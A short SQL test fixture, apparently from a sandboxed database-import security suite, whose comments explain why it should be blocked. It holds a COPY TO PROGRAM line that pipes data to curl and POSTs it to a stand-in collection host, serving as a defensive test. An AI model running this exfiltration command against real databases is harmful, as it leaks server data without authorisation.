-- M4-DUMP-SEC-091: a dump that tries to exfiltrate data over the network via
-- a program invoked by COPY TO PROGRAM. Blocked at the same privilege as
-- read_host_files_copy_program.sql (pg_execute_server_program), which is why
-- this never even reaches the sandbox network's absent route (compose.yaml:
-- the `sandbox` network is `internal: true` and shares no network with
-- `egress-proxy`) — the proxy's refusal counter has nothing to count here.
CREATE TABLE exfil (line text);
COPY (SELECT 'secret') TO PROGRAM 'curl -s -X POST --data-binary @- http://example.invalid/collect';
